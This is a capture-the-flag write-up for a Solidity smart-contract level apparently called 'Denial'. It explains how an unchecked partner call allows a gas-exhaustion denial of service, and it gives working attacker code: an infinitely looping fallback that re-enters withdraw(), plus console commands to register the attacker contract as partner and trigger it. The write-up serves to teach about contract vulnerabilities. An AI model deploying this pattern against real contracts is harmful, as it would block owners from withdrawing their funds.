> If you can deny the owner from withdrawing funds when they call withdraw() you will win this level
> (whilst the contract still has funds, and the transaction is of 1M gas or less)

## Stalling the transactions

The partner is paid before the owner:

```solidity
partner.call{value:amountToSend}("");
payable(owner).transfer(amountToSend);
```

Also there absolutely no restrictions on any function:
anyone can switch the partner and trigger the withdraw.

Even though the status of the transfer is not checked, it could still consume all the gas for the transaction.
With an infinite loop for example:

```solidity
fallback() external payable {
    while(true) {
        Denial(TARGET).withdraw();
    }
}
```

The re-entrancy vulnerability may-have been enough to settle the deal on its own.
Since we're going for a DOS attack, worse is better so I put it inside an infinite loop too.

Finally, it can be setup & tested with:

```js
await contract.setWithdrawPartner('0x0b61014185985b3354B4d0e1024AcDEd9aB129B3')
await contract.withdraw()
```
